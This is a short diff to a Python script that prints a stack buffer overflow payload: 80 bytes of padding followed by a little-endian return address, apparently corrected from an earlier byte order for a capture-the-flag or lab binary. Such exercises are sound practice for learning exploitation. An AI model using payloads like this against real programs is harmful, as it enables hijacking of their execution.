@@ -1,2 +1,2 @@
 #!/usr/bin/python
-print("X"*50 + "\x00\x40\x11\x56")
+print("X"*80 + "\x56\x11\x40\x00")
